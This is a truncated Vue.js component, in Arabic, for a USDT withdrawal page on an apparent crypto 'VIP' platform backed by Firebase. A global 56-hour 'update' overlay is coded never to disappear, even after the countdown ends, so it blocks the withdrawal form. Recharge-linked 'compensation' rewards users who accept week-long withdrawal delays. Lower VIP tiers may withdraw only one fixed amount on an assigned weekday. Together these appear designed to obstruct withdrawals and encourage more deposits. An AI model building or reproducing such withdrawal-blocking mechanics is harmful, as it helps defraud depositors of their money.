<template>
  <div class="withdraw-page">

    <!-- =====================================================
         شاشة التحديث العامة - مشتركة بين جميع المستخدمين
         ===================================================== -->
    <div v-if="showUpdateScreen" class="withdraw-update-overlay">

      <div class="update-box">

        <!-- دائرة التحميل -->
        <div v-if="remainingSeconds > 0" class="loader"></div>

        <!-- بعد انتهاء الـ56 ساعة -->
        <div v-else class="completed-icon">
          <i class="fas fa-check"></i>
        </div>

        <h3>
          {{ remainingSeconds > 0 ? 'جاري التحديث' : 'اكتمل التحديث' }}
        </h3>

        <p v-if="remainingSeconds > 0">
          يرجى الانتظار حتى انتهاء عملية التحديث
        </p>

        <p v-else>
          انتهت مدة التحديث ويمكنك استخدام صفحة السحب
        </p>

        <!-- العداد -->
        <div class="countdown">
          {{ remainingTime }}
        </div>

        <span class="countdown-label">
          {{ remainingSeconds > 0 ? 'الوقت المتبقي' : 'انتهى الوقت' }}
        </span>

        <!-- ====== جدول التعويضات ====== -->
        <div class="rewards-table">
          <h4 style="color: #fcd535; font-size: 14px; margin-bottom: 10px;">
            🎁 التعويضات عند تأخير السحب لمدة أسبوع
          </h4>
          <div class="table-scroll">
            <table>
              <thead>
                <tr>
                  <th>مبلغ الشحن</th>
                  <th>التعويض</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(reward, amount) in rechargeRewards" :key="amount">
                  <td>{{ formatNumber(amount) }} USDT</td>
                  <td>{{ formatNumber(reward) }} USDT</td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="table-note">
            <i class="fas fa-info-circle"></i>
            يتم تطبيق تأخير أسبوع على السحب مع تعويض حسب مبلغ الشحن
          </div>
        </div>

        <!-- معلومات إضافية -->
        <div class="update-info">

          <div class="update-info-row">
            <i class="fas fa-shield-alt"></i>
            <span>تحديث آمن عبر Firebase</span>
          </div>

          <div class="update-info-row">
            <i class="fas fa-users"></i>
            <span>الوقت موحد لجميع المستخدمين</span>
          </div>

        </div>

      </div>

    </div>


    <!-- =====================================================
         صفحة السحب
         ===================================================== -->
    <div class="card">

      <!-- رأس الصفحة -->
      <div class="card-header">

        <h2 class="title">
          <i class="fas fa-hand-holding-usd"></i>

          سحب الأرباح

          <span class="title-glow">
            USDT
          </span>
        </h2>

        <p class="sub">
          قم بإدخال معلومات السحب الخاصة بك
        </p>

      </div>


      <!-- =====================================================
           رصيد المستخدم
           ===================================================== -->
      <div class="balance-box">

        <div class="balance-info">

          <span class="balance-label">
            رصيدك الحالي القابل للسحب
          </span>

          <div class="balance-display">

            <img
              src="https://assets.coingecko.com/coins/images/325/large/tether.png"
              alt="USDT"
              class="balance-usdt-icon"
            >

            <span class="balance-amount">
              {{ vipBalance.toFixed(2) }}
            </span>

            <span class="balance-currency-badge">
              USDT
            </span>

          </div>

        </div>

      </div>


      <!-- =====================================================
           حالة VIP
           ===================================================== -->
      <div
        v-if="userVipLevel"
        class="vip-status-box"
      >

        <div class="vip-badge">

          <i class="fas fa-crown"></i>

          مستوى VIP {{ userVipLevel }}

        </div>


        <div class="user-contact">

          <i
            class="fas fa-phone"
            v-if="userPhone"
          ></i>

          <i
            class="fas fa-envelope"
            v-else
          ></i>

          {{ userContact }}

        </div>


        <div class="withdraw-condition">

          <i
            class="fas fa-check-circle"
            :class="{
              'condition-met':
              isVIP8OrAbove ||
              vipBalance >= minWithdrawAmount
            }"
          ></i>

          <span>

            الحد الأدنى:

            <strong>
              {{
                isVIP8OrAbove
                  ? 'بدون حد أدنى'
                  : minWithdrawAmount + ' USDT'
              }}
            </strong>

          </span>

        </div>


        <div class="withdraw-condition">

          <i
            class="fas fa-check-circle"
            :class="{
              'condition-met': isAllowedDay
            }"
          ></i>

          <span>

            يوم السحب:

            <strong>
              {{
                isVIP8OrAbove
                  ? 'أي يوم'
                  : withdrawDay
              }}
            </strong>

          </span>

        </div>


        <div
          v-if="isVIP8OrAbove"
          class="vip-special-badge"
        >

          <i class="fas fa-star"></i>

          مميزات VIP 8+:
          سحب أي مبلغ في أي وقت

        </div>

      </div>


      <div
        v-else
        class="vip-status-box error"
      >

        <i class="fas fa-exclamation-triangle"></i>

        <p>
          يجب أن يكون لديك اشتراك VIP للسحب
        </p>

      </div>


      <!-- =====================================================
           مبلغ السحب
           ===================================================== -->
      <div class="input-group">

        <label>

          <i class="fas fa-coins"></i>

          المبلغ

        </label>


        <div class="amount-input-wrapper">

          <input
            type="number"
            v-model.number="amount"
            placeholder="0.00"
            class="gold-input"
            @input="validateAmount"
            autocomplete="off"
            name="amount_field_x"
          >

          <span class="input-currency-badge">
            USDT
          </span>

        </div>


        <span
          v-if="amountError"
          class="input-error"
        >
          {{ amountError }}
        </span>

      </div>


      <!-- =====================================================
           الشبكة
           ===================================================== -->
      <div class="input-group">

        <label>

          <i class="fas fa-network-wired"></i>

          الشبكة

        </label>


        <div class="custom-dropdown-wrapper">

          <div class="custom-dropdown">

            <div
              class="dropdown-trigger"
              @click="toggleNetworkDropdown"
            >

              <div
                v-if="network"
                class="selected-network"
              >

                <img
                  :src="getNetworkIcon(network)"
                  :alt="network"
                  class="dropdown-icon"
                >

                <span>
                  {{ getNetworkLabel(network) }}
                </span>

              </div>


              <div
                v-else
                class="placeholder"
              >
                اختر الشبكة
              </div>


              <i
                class="fas fa-chevron-down"
                :class="{
                  'rotate': showNetworkDropdown
                }"
              ></i>

            </div>


            <div
              v-if="showNetworkDropdown"
              class="dropdown-menu"
            >

              <div
                v-for="net in networks"
                :key="net.value"
                class="dropdown-item"
                :class="{
                  active:
                  network === net.value
                }"
                @click="
                  selectNetwork(net.value)
                "
              >

                <img
                  :src="getNetworkIcon(net.value)"
                  :alt="net.value"
                  class="dropdown-item-icon"
                >


                <div class="dropdown-item-content">

                  <div class="dropdown-item-name">
                    {{ net.label }}
                  </div>

                  <div class="dropdown-item-symbol">
                    {{ net.value }}
                  </div>

                </div>


                <i
                  v-if="network === net.value"
                  class="fas fa-check"
                ></i>

              </div>

            </div>

          </div>

        </div>


        <span
          v-if="networkError"
          class="input-error"
        >
          {{ networkError }}
        </span>

      </div>


      <div class="fields-separator"></div>


      <!-- =====================================================
           المحفظة
           ===================================================== -->
      <div class="isolated-section">

        <input
          type="text"
          style="
            display:none!important;
            position:absolute!important;
            left:-9999px!important;
            top:-9999px!important;
            width:1px!important;
            height:1px!important;
            opacity:0!important;
          "
          autocomplete="off"
          name="w_fake_1"
          tabindex="-1"
        >


        <input
          type="password"
          style="
            display:none!important;
            position:absolute!important;
            left:-9999px!important;
            top:-9999px!important;
            width:1px!important;
            height:1px!important;
            opacity:0!important;
          "
          autocomplete="new-password"
          name="w_fake_2"
          tabindex="-1"
        >


        <div class="input-group wallet-section">

          <label>

            <i class="fas fa-qrcode"></i>

            عنوان المحفظة

          </label>


          <div class="wallet-input-wrapper">

            <input
              ref="walletInput"
              type="text"
              v-model="wallet"
              placeholder="أدخل عنوان محفظتك USDT"
              class="gold-input"
              @input="validateWallet"
              autocomplete="off"
              name="wallet_address_field"
              spellcheck="false"
              data-lpignore="true"
              data-form-type="other"
              data-browser-autofill="off"
            >

          </div>


          <span
            v-if="walletError"
            class="input-error"
          >
            {{ walletError }}
          </span>

        </div>

      </div>


      <div class="fields-separator"></div>


      <!-- =====================================================
           كلمة المرور
           ===================================================== -->
      <div class="isolated-section">

        <input
          type="text"
          style="
            display:none!important;
            position:absolute!important;
            left:-9999px!important;
            top:-9999px!important;
            width:1px!important;
            height:1px!important;
            opacity:0!important;
          "
          autocomplete="username"
          name="p_fake_1"
          tabindex="-1"
        >


        <input
          type="password"
          style="
            display:none!important;
            position:absolute!important;
            left:-9999px!important;
            top:-9999px!important;
            width:1px!important;
            height:1px!important;
            opacity:0!important;
          "
          autocomplete="current-password"
          name="p_fake_2"
          tabindex="-1"
        >


        <div class="input-group password-section">

          <label>

            <i class="fas fa-lock"></i>

            كلمة المرور

          </label>


          <div class="password-input-wrapper">

            <input
              ref="passwordInput"
              :type="
                showPassword
                  ? 'text'
                  : 'password'
              "
              v-model="password"
              placeholder="أدخل كلمة المرور"
              class="gold-input"
              autocomplete="off"
              name="password_field_y"
              spellcheck="false"
              data-lpignore="true"
              data-form-type="other"
              data-browser-autofill="off"
            >


            <button
              type="button"
              class="toggle-password-btn"
              @click="
                showPassword = !showPassword
              "
              tabindex="-1"
            >

              <i
                :class="
                  showPassword
                    ? 'fas fa-eye-slash'
                    : 'fas fa-eye'
                "
              ></i>

            </button>

          </div>

        </div>

      </div>


      <!-- =====================================================
           ملخص الطلب
           ===================================================== -->
      <div
        v-if="showSummary"
        class="summary-box"
      >

        <h3>
          📋 ملخص طلب السحب
        </h3>


        <div class="summary-item">

          <span>
            معلومات الاتصال:
          </span>

          <span class="summary-value">
            {{ userContact }}
          </span>

        </div>


        <div class="summary-item">

          <span>
            مستوى VIP:
          </span>

          <span class="summary-value">
            {{ userVipLevel || 'لا يوجد' }}
          </span>

        </div>


        <div class="summary-item">

          <span>
            المبلغ المطلوب:
          </span>

          <span class="summary-value">
            {{ Number(amount).toFixed(2) }}
            USDT
          </span>

        </div>


        <div class="summary-item">

          <span>
            الرسوم (5%):
          </span>

          <span class="summary-value fee">
            -{{ fee.toFixed(2) }}
            USDT
          </span>

        </div>


        <div class="summary-item">

          <span>
            المبلغ الصافي:
          </span>

          <span class="summary-value net">
            {{ netAmount.toFixed(2) }}
            USDT
          </span>

        </div>


        <div class="summary-item">

          <span>
            الشبكة:
          </span>

          <span class="summary-value">
            {{ network }}
          </span>

        </div>


        <div class="summary-item">

          <span>
            عنوان المحفظة:
          </span>

          <span class="summary-value address">

            {{
              wallet.substring(0, 10)
            }}...{{
              wallet.substring(wallet.length - 10)
            }}

          </span>

        </div>


        <div class="summary-item">

          <span>
            يوم السحب:
          </span>

          <span class="summary-value">

            {{
              isVIP8OrAbove
                ? 'أي يوم'
                : withdrawDay
            }}

          </span>

        </div>


        <div class="summary-item">

          <span>
            الحد الأدنى:
          </span>

          <span class="summary-value">

            {{
              isVIP8OrAbove
                ? 'بدون حد أدنى'
                : minWithdrawAmount + ' USDT'
            }}

          </span>

        </div>


        <div class="summary-item total">

          <span>
            سيتم خصم من رصيد VIP:
          </span>

          <span class="summary-value">
            {{ Number(amount).toFixed(2) }}
            USDT
          </span>

        </div>


        <div class="summary-item">

          <span>
            رصيد VIP بعد السحب:
          </span>

          <span class="summary-value">

            {{
              (
                vipBalance -
                Number(amount)
              ).toFixed(2)
            }}

            USDT

          </span>

        </div>

      </div>


      <!-- =====================================================
           تحذير
           ===================================================== -->
      <div class="warning-box">

        <i class="fas fa-shield-alt"></i>

        <div class="warning-text">

          <p>
            يرجى التأكد من صحة المعلومات قبل الإرسال
          </p>

          <p class="small">

            سيتم خصم
            {{ Number(amount) || 0 }}
            USDT
            من رصيد VIP الخاص بك.

            ستستلم
            {{ netAmount.toFixed(2) }}
            USDT
            بعد خصم 5% رسوم

          </p>

        </div>

      </div>


      <!-- =====================================================
           زر السحب
           ===================================================== -->
      <button
        class="gold-button"
        @click="submitWithdraw"
        :disabled="
          isLoading ||
          !isFormValid
        "
      >

        <i
          class="fas fa-paper-plane"
          v-if="!isLoading"
        ></i>

        <i
          class="fas fa-spinner fa-spin"
          v-else
        ></i>

        {{
          isLoading
            ? 'جاري المعالجة...'
            : 'تأكيد السحب'
        }}

      </button>


      <!-- =====================================================
           الرسائل
           ===================================================== -->
      <transition name="fade">

        <div
          v-if="message"
          class="message"
          :class="messageType"
        >

          <i
            :class="
              messageType === 'error'
                ? 'fas fa-exclamation-circle'
                : 'fas fa-check-circle'
            "
          ></i>

          {{ message }}

        </div>

      </transition>

    </div>

  </div>
</template>


<script>

import { auth, db } from "../firebase";

import {
  doc,
  getDoc,
  setDoc,
  runTransaction,
  collection,
  serverTimestamp,
  query,
  where,
  getDocs,
  getCountFromServer
} from "firebase/firestore";

import {
  signInWithEmailAndPassword
} from "firebase/auth";


// ============================================================
// Cache
// ============================================================

const dataCache = new Map();

const CACHE_DURATION =
  5 * 60 * 1000;


function getCachedData(key) {

  const cached =
    dataCache.get(key);

  if (
    cached &&
    Date.now() - cached.timestamp <
    CACHE_DURATION
  ) {

    return cached.data;

  }

  dataCache.delete(key);

  return null;
}


function setCachedData(
  key,
  data
) {

  dataCache.set(
    key,
    {
      data,
      timestamp: Date.now()
    }
  );

}


// ============================================================
// Component
// ============================================================

export default {

  name: "Withdraw",


  data() {

    return {

      // ======================================================
      // Timer - 56 hours (56 * 60 * 60 = 201600 seconds)
      // ======================================================

      showUpdateScreen: true,

      remainingSeconds: 0,

      timerStartTime: null,

      timerEndTime: null,

      countdownInterval: null,


      // ======================================================
      // User
      // ======================================================

      vipBalance: 0,

      amount: "",

      network: "",

      wallet: "",

      password: "",

      showPassword: false,

      isLoading: false,

      message: "",

      messageType: "info",

      userVipLevel: null,

      userPhone: "",

      userEmail: "",


      minWithdrawAmount: 5,


      showNetworkDropdown: false,


      networks: [

        {
          value: "TRC20",
          label: "Tron (TRC20)"
        },

        {
          value: "ERC20",
          label: "Ethereum (ERC20)"
        },

        {
          value: "BEP20",
          label: "BNB Chain (BEP20)"
        },

        {
          value: "SOL",
          label: "Solana (SOL)"
        }

      ],


      // ======================================================
      // Errors
      // ======================================================

      amountError: "",

      networkError: "",

      walletError: "",


      // ======================================================
      // Fee
      // ======================================================

      feePercentage: 5,


      // ======================================================
      // VIP limits
      // ======================================================

      vipLimits: {

        1: 5,

        2: 7,

        3: 25,

        4: 50,

        5: 150,

        6: 450,

        7: 675,

        8: 0,

        9: 0,

        10: 0,

        11: 0,

        12: 0,

        13: 0,

        14: 0,

        15: 0

      },


      // ======================================================
      // Withdraw days
      // ======================================================

      withdrawDays: {

        1: "السبت",

        2: "السبت",

        3: "السبت",

        4: "الأحد",

        5: "الأحد",

        6: "الاثنين",

        7: "الاثنين",

        8: "أي يوم",

        9: "أي يوم",

        10: "أي يوم",

        11: "أي يوم",

        12: "أي يوم",

        13: "أي يوم",

        14: "أي يوم",

        15: "أي يوم"

      },


      // ======================================================
      // Withdraw delays and rewards
      // ======================================================

      rechargeRewards: {

        50: 5,
        100: 10,
        300: 30,
        900: 90,
        1350: 135,
        1800: 180,
        3600: 260,
        7200: 720,
        14400: 1440,
        18800: 1880,
        37600: 3760,
        75200: 7520,
        150400: 15040

      },


      dataLoaded: false,

      cacheKey: ""

    };

  },


  // ==========================================================
  // Computed
  // ==========================================================

  computed: {


    // ========================================================
    // Countdown - shows HH:MM:SS format
    // ========================================================

    remainingTime() {

      const seconds =
        Math.max(
          0,
          this.remainingSeconds
        );


      const hours =
        Math.floor(
          seconds / 3600
        );


      const minutes =
        Math.floor(
          (seconds % 3600) / 60
        );


      const secs =
        seconds % 60;


      return (

        String(hours)
          .padStart(2, "0")

        + ":" +

        String(minutes)
          .padStart(2, "0")

        + ":" +

        String(secs)
          .padStart(2, "0")

      );

    },


    isVIP8OrAbove() {

      return (
        Number(this.userVipLevel) >= 8
      );

    },


    withdrawDay() {

      return (
        this.withdrawDays[
          this.userVipLevel
        ] || ""
      );

    },


    isAllowedDay() {

      if (!this.userVipLevel) {
        return false;
      }


      if (this.isVIP8OrAbove) {
        return true;
      }


      const dayMap = {

        "السبت":
          "Saturday",

        "الأحد":
          "Sunday",

        "الاثنين":
          "Monday",

        "الثلاثاء":
          "Tuesday",

        "الأربعاء":
          "Wednesday",

        "الخميس":
          "Thursday",

        "الجمعة":
          "Friday"

      };


      const today =
        new Date()
          .toLocaleDateString(
            "en-US",
            {
              weekday: "long"
            }
          );


      const allowedDay =
        this.withdrawDays[
          this.userVipLevel
        ];


      return (
        today ===
        dayMap[allowedDay]
      );

    },


    fee() {

      if (!this.amount) {
        return 0;
      }


      return (
        Number(this.amount) *
        this.feePercentage /
        100
      );

    },


    netAmount() {

      if (!this.amount) {
        return 0;
      }


      return (
        Number(this.amount) -
        this.fee
      );

    },


    isFormValid() {


      if (this.isVIP8OrAbove) {

        return (

          this.amount &&

          !this.amountError &&

          this.network &&

          !this.networkError &&

          this.wallet &&

          !this.walletError &&

          this.password &&

          this.userVipLevel &&

          this.vipBalance >=
          Number(this.amount) &&

          Number(this.amount) > 0

        );

      }


      return (

        this.amount &&

        !this.amountError &&

        this.network &&

        !this.networkError &&

        this.wallet &&

        !this.walletError &&

        this.password &&

        this.userVipLevel &&

        this.isAllowedDay &&

        Number(this.amount) ===
        this.minWithdrawAmount &&

        this.vipBalance >=
        Number(this.amount)

      );

    },


    showSummary() {

      return (

        this.amount &&

        this.network &&

        this.wallet &&

        this.userVipLevel

      );

    },


    userContact() {

      if (this.userPhone) {

        return this.userPhone;

      }


      if (this.userEmail) {

        return this.userEmail;

      }


      return "لا يوجد";

    }

  },


  // ==========================================================
  // Watch
  // ==========================================================

  watch: {


    amount() {

      this.validateAmount();

    },


    network() {

      this.validateNetwork();

    },


    wallet() {

      this.validateWallet();

    },


    userVipLevel() {

      if (this.userVipLevel) {

        if (!this.isVIP8OrAbove) {

          this.minWithdrawAmount =
            this.vipLimits[
              this.userVipLevel
            ] || 5;

        } else {

          this.minWithdrawAmount = 0;

        }

      }

    }

  },


  // ==========================================================
  // Created
  // ==========================================================

  async created() {

    const user =
      auth.currentUser;


    if (user) {

      this.cacheKey =
        `user_data_${user.uid}`;


      const cachedData =
        getCachedData(
          this.cacheKey
        );


      if (
        cachedData &&
        !this.dataLoaded
      ) {

        this.applyUserData(
          cachedData
        );

      }

    }


    // تشغيل العداد العالمي من Firebase
    await this.initializeGlobalTimer();


    // تحميل بيانات المستخدم
    if (!this.dataLoaded) {

      await this.loadUserData();

    }

  },


  // ==========================================================
  // Mounted
  // ==========================================================

  mounted() {

    this.clearBrowserAutofill();

    this.preventAutocomplete();

  },


  // ==========================================================
  // Before unmount
  // ==========================================================

  beforeUnmount() {

    if (
      this.countdownInterval
    ) {

      clearInterval(
        this.countdownInterval
      );

      this.countdownInterval =
        null;

    }

  },


  // ==========================================================
  // Methods
  // ==========================================================

  methods: {


    // ========================================================
    // Format number
    // ========================================================

    formatNumber(num) {

      if (num >= 1000) {
        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      }
      return num.toString();

    },


    // ========================================================
    // إنشاء / قراءة المؤقت العالمي - 56 ساعة
    // ========================================================

    async initializeGlobalTimer() {

      try {

        const timerRef =
          doc(
            db,
            "system",
            "withdrawTimer"
          );


        /*
         * نستخدم Transaction حتى لو دخل 100 مستخدم
         * في نفس اللحظة، يتم إنشاء وقت واحد فقط.
         */

        await runTransaction(
          db,
          async (transaction) => {

            const timerSnap =
              await transaction.get(
                timerRef
              );


            if (!timerSnap.exists()) {

              // حساب وقت الانتهاء = الآن + 56 ساعة
              const now = new Date();
              const endTime = new Date(now.getTime() + 56 * 60 * 60 * 1000);

              transaction.set(
                timerRef,
                {

                  startTime:
                    serverTimestamp(),

                  endTime: endTime,

                  duration:
                    56 * 60 * 60,

                  active: true,

                  createdAt:
                    serverTimestamp(),

                  type:
                    "global_withdraw_update"

                }
              );

            }

          }
        );


        /*
         * بعد انتهاء Transaction نقرأ
         * الوقت الحقيقي المحفوظ في Firebase.
         */

        const timerSnap =
          await getDoc(
            timerRef
          );


        if (!timerSnap.exists()) {

          console.error(
            "Timer document does not exist"
          );

          return;

        }


        const timerData =
          timerSnap.data();


        // محاولة الحصول على endTime
        let endTime = null;

        if (timerData.endTime) {
          // إذا كان endTime مخزناً كـ Timestamp
          if (timerData.endTime.toDate) {
            endTime = timerData.endTime.toDate();
          } else if (timerData.endTime instanceof Date) {
            endTime = timerData.endTime;
          } else {
            // محاولة تحويله إلى Date
            endTime = new Date(timerData.endTime);
          }
        } else if (timerData.startTime) {
          // إذا لم يكن هناك endTime، نستخدم startTime + duration
          const startDate = timerData.startTime.toDate ? timerData.startTime.toDate() : new Date(timerData.startTime);
          const duration = Number(timerData.duration || 56 * 60 * 60);
          endTime = new Date(startDate.getTime() + duration * 1000);
        } else {
          console.error("لا يوجد وقت بداية أو نهاية في Firebase");
          return;
        }


        // التحقق من صحة endTime
        if (!endTime || isNaN(endTime.getTime())) {
          console.error("endTime غير صالح:", endTime);
          return;
        }

        this.timerEndTime = endTime;
        this.timerStartTime = timerData.startTime ? (timerData.startTime.toDate ? timerData.startTime.toDate() : new Date(timerData.startTime)) : null;


        // بدء العد
        this.updateGlobalCountdown();


        // إذا كان العداد موجوداً مسبقاً، نوقفه
        if (this.countdownInterval) {
          clearInterval(this.countdownInterval);
          this.countdownInterval = null;
        }


        // تحديث كل ثانية
        this.countdownInterval =
          setInterval(
            () => {

              this.updateGlobalCountdown();

            },
            1000
          );


      } catch (error) {

        console.error(
          "خطأ في المؤقت العالمي:",
          error
        );

        /*
         * مهم:
         * لا نخفي شاشة التحديث عند حدوث خطأ.
         */

        this.showUpdateScreen = true;

      }

    },


    // ========================================================
    // تحديث العداد
    // ========================================================

    updateGlobalCountdown() {

      if (!this.timerEndTime) {

        // إذا لم يكن هناك وقت نهاية، نبقى الشاشة ظاهرة
        this.showUpdateScreen = true;
        return;

      }


      const now =
        Date.now();


      const end =
        this.timerEndTime.getTime();


      // حساب الوقت المتبقي بالثواني
      const remaining =
        Math.max(
          0,
          Math.floor(
            (end - now) / 1000
          )
        );


      // تحديث الثواني المتبقية
      this.remainingSeconds =
        remaining;


      /*
       * الشاشة لا تختفي أبداً.
       *
       * حتى عند 00:00:00 تبقى موجودة
       * وتتحول إلى "اكتمل التحديث".
       */

      this.showUpdateScreen =
        true;


      // إذا وصلنا إلى الصفر، نوقف العداد
      if (remaining <= 0) {

        this.remainingSeconds = 0;

        if (
          this.countdownInterval
        ) {

          clearInterval(
            this.countdownInterval
          );

          this.countdownInterval =
            null;

        }

      }

    },


    // ========================================================
    // تطبيق بيانات المستخدم
    // ========================================================

    applyUserData(userData) {

      if (
        typeof userData.vipBalance ===
        "number"
      ) {

        this.vipBalance =
          userData.vipBalance;

      } else if (
        typeof userData.balance ===
        "number"
      ) {

        this.vipBalance =
          userData.balance;

      } else {

        this.vipBalance = 0;

      }


      this.userPhone =
        userData.phoneNumber || "";


      this.userEmail =
        userData.email || "";


      if (userData.vipLevel) {

        this.userVipLevel =
          userData.vipLevel;

      } else if (
        userData.vipData
      ) {

        this.userVipLevel =
          userData.vipData.level;

      }


      this.dataLoaded = true;

    },


    // ========================================================
    // تحميل بيانات المستخدم
    // ========================================================

    async loadUserData() {

      const user =
        auth.currentUser;


      if (!user) {

        this.$router.push(
          "/login"
        );

        return;

      }


      try {

        const cacheKey =
          this.cacheKey ||
          `user_data_${user.uid}`;


        const cachedData =
          getCachedData(
            cacheKey
          );


        if (cachedData) {

          this.applyUserData(
            cachedData
          );

          return;

        }


        const userRef =
          doc(
            db,
            "users",
            user.uid
          );


        const userSnap =
          await getDoc(
            userRef
          );


        if (
          userSnap.exists()
        ) {

          const userData =
            userSnap.data();


          const cacheData = {

            vipBalance:
              userData.vipBalance ||
              userData.balance ||
              0,

            phoneNumber:
              userData.phoneNumber ||
              "",

            email:
              userData.email ||
              "",

            vipLevel:
              userData.vipLevel ||
              null,

            vipData: null

          };


          if (
            !cacheData.vipLevel
          ) {

            const vipRef =
              doc(
                db,
                "users",
                user.uid,
                "vip",
                "current"
              );


            const vipSnap =
              await getDoc(
                vipRef
              );


            if (
              vipSnap.exists()
            ) {

              cacheData.vipData = {

                level:
                  vipSnap.data().level

              };

            }

          }


          setCachedData(
            cacheKey,
            cacheData
          );


          this.applyUserData(
            cacheData
          );


          if (
            !this.userVipLevel &&
            !cacheData.vipData
          ) {

            this.showMessage(
              "لا يوجد اشتراك VIP نشط",
              "error"
            );

          }

        }


      } catch (error) {

        console.error(
          "خطأ:",
          error
        );


        this.showMessage(
          "حدث خطأ في تحميل البيانات",
          "error"
        );

      }

    },


    // ========================================================
    // Validation
    // ========================================================

    validateAmount() {

      if (!this.amount) {

        this.amountError =
          "الرجاء إدخال المبلغ";

      } else if (
        this.isVIP8OrAbove
      ) {

        if (
          Number(this.amount) >
          this.vipBalance
        ) {

          this.amountError =
            "المبلغ أكبر من رصيد VIP الخاص بك";

        } else if (
          Number(this.amount) <= 0
        ) {

          this.amountError =
            "الرجاء إدخال مبلغ أكبر من صفر";

        } else {

          this.amountError = "";

        }

      } else if (
        Number(this.amount) !==
        this.minWithdrawAmount
      ) {

        this.amountError =
          `يجب سحب ${this.minWithdrawAmount} USDT فقط`;

      } else if (
        Number(this.amount) >
        this.vipBalance
      ) {

        this.amountError =
          "رصيد VIP غير كافٍ للسحب";

      } else {

        this.amountError = "";

      }

    },


    validateNetwork() {

      if (!this.network) {

        this.networkError =
          "الرجاء اختيار الشبكة";

      } else {

        this.networkError = "";

      }

    },


    validateWallet() {

      if (!this.wallet) {

        this.walletError =
          "الرجاء إدخال عنوان محفظتك";

      } else if (
        this.wallet.length < 20
      ) {

        this.walletError =
          "عنوان المحفظة قصير جداً";

      } else {

        this.walletError = "";

      }

    },


    // ========================================================
    // Network
    // ========================================================

    getNetworkIcon(network) {

      const icons = {

        TRC20:
          "https://assets.coingecko.com/coins/images/1094/large/tron-logo.png",

        ERC20:
          "https://assets.coingecko.com/coins/images/279/large/ethereum.png",

        BEP20:
          "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",

        SOL:
          "https://assets.coingecko.com/coins/images/4128/large/solana.png"

      };


      return (
        icons[network] || ""
      );

    },


    getNetworkLabel(network) {

      const labels = {

        TRC20:
          "Tron (TRC20)",

        ERC20:
          "Ethereum (ERC20)",

        BEP20:
          "BNB Chain (BEP20)",

        SOL:
          "Solana (SOL)"

      };


      return (
        labels[network] || ""
      );

    },


    toggleNetworkDropdown() {

      this.showNetworkDropdown =
        !this.showNetworkDropdown;

    },


    selectNetwork(value) {

      this.network =
        value;

      this.showNetworkDropdown =
        false;

      this.validateNetwork();

    },


    // ========================================================
    // حساب التعويضات
    // ========================================================

    calculateReward(rechargeAmount) {

      // البحث عن أقرب قيمة شحن
      const amounts = Object.keys(this.rechargeRewards).map(Number);
      let reward = 0;

      for (let i = amounts.length - 1; i >= 0; i--) {
        if (rechargeAmount >= amounts[i]) {
          reward = this.rechargeRewards[amounts[i]];
          break;
        }
      }

      return reward;

    },


    // ========================================================
    // التحقق من وجود تأخير
    // ========================================================

    async checkWithdrawDelay(userId) {

      try {

        const delayRef = doc(db, "withdraw_delays", userId);
        const delaySnap = await getDoc(delayRef);

        if (delaySnap.exists()) {
          const data = delaySnap.data();
          const delayEnd = data.delayEnd.toDate();
          const now = new Date();

          if (now < delayEnd) {
            return {
              isDelayed: true,
              remainingTime: Math.floor((delayEnd - now) / 1000),
              reward: data.reward || 0,
              delayDays: data.delayDays || 7
            };
          }
        }

        return {
          isDelayed: false,
          remainingTime: 0,
          reward: 0,
          delayDays: 0
        };

      } catch (error) {
        console.error("Error checking delay:", error);
        return {
          isDelayed: false,
          remainingTime: 0,
          reward: 0,
          delayDays: 0
        };
      }

    },


    // ========================================================
    // تطبيق تأخير السحب
    // ========================================================

    async applyWithdrawDelay(userId, rechargeAmount) {

      const reward = this.calculateReward(rechargeAmount);
      const delayDays = 7; // تأخير لمدة اسبوع

      const delayEnd = new Date();
      delayEnd.setDate(delayEnd.getDate() + delayDays);

      const delayRef = doc(db, "withdraw_delays", userId);

      await setDoc(delayRef, {
        userId: userId,
        delayStart: serverTimestamp(),
        delayEnd: delayEnd,
        delayDays: delayDays,
        reward: reward,
        rechargeAmount: rechargeAmount,
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
      });

      // إضافة التعويض إلى رصيد المستخدم
      const userRef = doc(db, "users", userId);

      await runTransaction(db, async (transaction) => {
        const userSnap = await transaction.get(userRef);
        const userData = userSnap.data();
        const currentBalance = Number(userData.vipBalance || 0);

        transaction.update(userRef, {
          vipBalance: currentBalance + reward,
          lastReward: reward,
          lastRewardDate: serverTimestamp()
        });

        // تسجيل المعاملة
        const transactionDocRef = doc(collection(db, "transactions"));
        transaction.set(transactionDocRef, {
          userId: userId,
          type: "withdraw_delay_reward",
          amount: reward,
          rechargeAmount: rechargeAmount,
          delayDays: delayDays,
          status: "completed",
          createdAt: serverTimestamp(),
          description: `تعويض تأخير السحب لمدة ${delayDays} أيام`
        });
      });

      return {
        reward: reward,
        delayDays: delayDays,
        delayEnd: delayEnd
      };

    },


    // ========================================================
    // Messages
    // ========================================================

    showMessage(
      msg,
      type = "info"
    ) {

      this.message =
        msg;

      this.messageType =
        type;


      setTimeout(
        () => {

          this.message = "";

        },
        5000
      );

    },


    // ========================================================
    // Browser Autofill
    // ========================================================

    clearBrowserAutofill() {

      this.$nextTick(
        () => {

          if (
            this.$refs.walletInput
          ) {

            this.$refs.walletInput.value =
              "";

            this.wallet =
              "";

          }


          if (
            this.$refs.passwordInput
          ) {

            this.$refs.passwordInput.value =
              "";

            this.password =
              "";

          }

        }
      );

    },


    preventAutocomplete() {

      this.$nextTick(
        () => {

          setTimeout(
            () => {

              const allInputs =
                document.querySelectorAll(
                  "input"
                );


              allInputs.forEach(
                input => {

                  input.setAttribute(
                    "autocomplete",
                    "off"
                  );


                  input.setAttribute(
                    "data-lpignore",
                    "true"
                  );


                  input.setAttribute(
                    "data-form-type",
                    "other"
                  );


                  input.setAttribute(
                    "data-browser-autofill",
                    "off"
                  );

                }
              );

            },
            100
          );

        }
      );

    },


    // ========================================================
    // Submit Withdraw
    // ========================================================

    async submitWithdraw() {

      if (!this.isFormValid) {

        return;

      }


      this.isLoading =
        true;


      const user =
        auth.currentUser;


      if (!user) {

        this.showMessage(
          "انتهت جلسة تسجيل الدخول",
          "error"
        );

        this.isLoading =
          false;

        return;

      }


      const withdrawAmount =
        Number(this.amount);


      const feeAmount =
        this.fee;


      const netAmountValue =
        this.netAmount;


      const transactionId =
        "WITHDRAW_" +
        Date.now() +
        "_" +
